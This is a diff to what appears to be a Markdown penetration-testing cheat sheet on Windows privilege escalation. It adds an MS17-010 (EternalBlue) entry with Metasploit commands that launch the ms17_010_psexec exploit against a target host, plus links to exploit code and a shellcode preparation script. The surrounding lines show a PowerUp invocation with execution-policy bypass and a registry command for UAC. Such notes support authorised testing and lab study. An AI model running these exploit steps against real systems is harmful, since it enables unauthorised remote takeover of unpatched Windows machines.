@@ -680,6 +680,16 @@ powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-All
 	C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
 	```
 		* [More Info](https://www.howtogeek.com/howto/windows-vista/enable-or-disable-uac-from-the-windows-vista-command-line/)
+* MS17-010
+	* Metasploit
+		```
+		use windows/smb/ms17_010_psexec
+		set RHOST $IP 
+		run
+		```
+	* [Original](https://github.com/kyeh0/MS17-010)
+	* [How to Compile](https://github.com/a6avind/MS17-010)
+	* [Script](https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/shellcode/shell_prep.sh)
 
 [Back](#summary)
 
